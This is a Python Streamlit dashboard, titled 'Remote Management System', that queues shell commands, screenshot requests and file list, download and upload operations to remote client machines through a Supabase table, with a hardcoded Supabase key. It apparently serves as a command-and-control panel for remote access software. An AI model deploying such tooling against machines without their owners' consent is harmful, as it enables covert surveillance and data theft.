import streamlit as st
from st_on_hover_tabs import on_hover_tabs
from streamlit_lottie import st_lottie
from supabase import create_client
from datetime import datetime, timezone
import base64
from PIL import Image
import io
import time
import json
import requests

# Initialize Supabase
supabase = create_client(
    "https://nufgpguitvkxctpagwwf.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51ZmdwZ3VpdHZreGN0cGFnd3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY5NTA0MTIsImV4cCI6MjA1MjUyNjQxMn0.-MLSuSnfllGJrrQMEfHrQjxZoeujy6jZiHG9L9jY6Ik"
)

# Page Configuration
st.set_page_config(
    page_title="Remote Management System",
    page_icon="🖥️",
    layout="wide"
)

# Import external CSS for additional styling (optional)
# Make sure the file style.css exists in the same directory.
try:
    with open("style.css") as f:
        st.markdown('<style>' + f.read() + '</style>', unsafe_allow_html=True)
except Exception:
    pass

# Custom CSS (additional inline styles)
st.markdown("""
<style>
    .client-card {
        background-color: #1E1E1E;
        border: 1px solid #00FF00;
        border-radius: 15px;
        padding: 20px;
        margin: 15px 0;
    }
    .status-online {
        color: #00FF00;
        font-weight: bold;
    }
    .status-offline {
        color: #FF0000;
        font-weight: bold;
    }
    .header-title {
        font-size: 2.5rem;
        font-weight: bold;
        color: #00FF00;
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader {
        font-size: 1.5rem;
        color: #CCCCCC;
        margin-bottom: 10px;
    }
    /* Override default sidebar background */
    .css-1d391kg {  
        background-color: #111;
    }
</style>
""", unsafe_allow_html=True)

# Helper Functions
def decode_image(base64_string: str) -> Image.Image:
    try:
        img_bytes = base64.b64decode(base64_string)
        return Image.open(io.BytesIO(img_bytes))
    except Exception as e:
        st.error(f"Error decoding image: {e}")
        return None

def get_client_status(last_seen: str) -> str:
    try:
        last_seen_time = datetime.fromisoformat(last_seen.replace('Z', '+00:00'))
        time_diff = datetime.now(timezone.utc) - last_seen_time
        return "online" if time_diff.total_seconds() < 60 else "offline"
    except Exception:
        return "unknown"

def send_command(client_id: str, command: str):
    try:
        data = {
            "client_id": client_id,
            "type": "command",
            "content": command,
            "status": "pending",
        }
        supabase.table('messages').insert(data).execute()
        return True
    except Exception as e:
        st.error(f"Error sending command: {e}")
        return False

def load_lottieurl(url: str):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()

# UI Pages
def show_home():
    st.markdown("<div class='header-title'>Remote Management System</div>", unsafe_allow_html=True)
    st.write("Welcome to the Remote Management System dashboard. Below are the connected clients:")

    # Get all clients from Supabase
    clients = supabase.table('clients')\
            .select('*')\
            .order('last_seen', desc=True)\
            .execute()

    if not clients.data:
        st.warning("No clients connected")
        return

    for c in clients.data:
        status = get_client_status(c['last_seen'])
        card_html = f"""
        <div class="client-card">
            <h3>{c['hostname']} ({c['client_id']})</h3>
            <p><strong>OS:</strong> {c['os']}</p>
            <p><strong>IP:</strong> {c['ip_address']}</p>
            <p><strong>Status:</strong> <span class="status-{status}">{status.upper()}</span></p>
            <p><strong>Last Seen:</strong> {c['last_seen']}</p>
        </div>
        """
        st.markdown(card_html, unsafe_allow_html=True)

    # Optionally display a Lottie animation at the bottom of the home page
    lottie_animation = load_lottieurl("https://assets3.lottiefiles.com/packages/lf20_yp2m9iwx.json")
    if lottie_animation:
        st_lottie(lottie_animation, height=300)

def show_command_center(selected_client):
    st.header("Command Center")
    with st.form("command_form"):
        command = st.text_input("Enter Command", placeholder="Type your command here")
        if st.form_submit_button("Execute"):
            if command:
                if send_command(selected_client, f"cmd {command}"):
                    st.success("Command sent successfully!")

def show_screenshot(selected_client):
    st.header("Screenshot")
    if st.button("Capture Screenshot"):
        if send_command(selected_client, "get image"):
            st.success("Screenshot request sent!")
            time.sleep(2)

def show_file_manager(selected_client):
    st.header("File Manager")
    fm_tabs = st.tabs(["List Files", "Download File", "Upload File"])
    
    with fm_tabs[0]:
        st.subheader("List Files")
        directory = st.text_input("Directory", value=".")
        if st.button("List Files"):
            command = f"file list {directory}"
            if send_command(selected_client, command):
                st.success("List Files command sent!")
    
    with fm_tabs[1]:
        st.subheader("Download File")
        filepath = st.text_input("File path to download")
        if st.button("Download File"):
            command = f"file get {filepath}"
            if send_command(selected_client, command):
                st.success("Download command sent! Check Message History for file data.")
    
    with fm_tabs[2]:
        st.subheader("Upload File")
        uploaded_file = st.file_uploader("Choose a file to upload")
        destination = st.text_input("Destination path on client", value="C:/destination/")
        if st.button("Upload File"):
            if uploaded_file and destination:
                file_bytes = uploaded_file.read()
                file_b64 = base64.b64encode(file_bytes).decode()
                payload = json.dumps({
                    "destination": destination + uploaded_file.name,
                    "content": file_b64
                })
                command = f"file upload {payload}"
                if send_command(selected_client, command):
                    st.success("Upload command sent!")
            else:
                st.error("Please select a file and specify a destination.")

def show_message_history(selected_client):
    st.header("Message History")
    if st.button("Refresh Messages"):
        messages = supabase.table('messages')\
            .select('*')\
            .eq('client_id', selected_client)\
            .order('created_at', desc=True)\
            .limit(50)\
            .execute()
            
        for msg in messages.data:
            with st.expander(
                f"{msg['type'].upper()} - {msg['created_at']}",
                expanded=False
            ):
                if msg['type'] == 'text':
                    st.code(msg['content'], language='bash')
                elif msg['type'] == 'image':
                    img = decode_image(msg['content'])
                    if img:
                        st.image(img)
                elif msg['type'] == 'file':
                    try:
                        file_info = json.loads(msg['content'])
                        filename = file_info.get("filename", "downloaded_file")
                        file_b64 = file_info.get("content", "")
                        file_bytes = base64.b64decode(file_b64)
                        st.download_button("Download File", file_bytes, file_name=filename)
                    except Exception as e:
                        st.error(f"Error processing file message: {e}")
                st.text(f"Status: {msg['status']}")

# Sidebar Navigation using On Hover Tabs
with st.sidebar:
    tabs = on_hover_tabs(
        tabName=['Home', 'Clients', 'Command', 'Screenshot', 'Files', 'History'],
        iconName=['home', 'users', 'terminal', 'camera', 'folder', 'clock'],
        default_choice=0,
        styles={
            'navtab': {
                'background-color': '#111',
                'color': '#818181',
                'font-size': '18px',
                'transition': '.3s',
                'white-space': 'nowrap',
                'text-transform': 'uppercase'
            },
            'tabOptionsStyle': {':hover :hover': {'color': 'red', 'cursor': 'pointer'}},
            'iconStyle': {'position': 'fixed', 'left': '7.5px', 'text-align': 'left'},
            'tabStyle': {'list-style-type': 'none', 'margin-bottom': '30px', 'padding-left': '30px'}
        },
        key="1"
    )

# Main UI Routing
if tabs == "Home":
    show_home()
else:
    # For pages other than home, first require the selection of a client.
    with st.sidebar:
        clients = supabase.table('clients')\
            .select('*')\
            .order('last_seen', desc=True)\
            .execute()
        if clients.data:
            selected_client = st.selectbox(
                "Select Client",
                options=[c['client_id'] for c in clients.data],
                format_func=lambda x: next(
                    (f"{c['hostname']} ({c['client_id']})" 
                     for c in clients.data if c['client_id'] == x),
                    x
                )
            )
        else:
            st.warning("No clients connected")
            selected_client = None

    if selected_client:
        if tabs == "Clients":
            show_home()  # "Clients" page can show the same info as the home page.
        elif tabs == "Command":
            show_command_center(selected_client)
        elif tabs == "Screenshot":
            show_screenshot(selected_client)
        elif tabs == "Files":
            show_file_manager(selected_client)
        elif tabs == "History":
            show_message_history(selected_client)
    else:
        st.error("Please ensure at least one client is connected.")

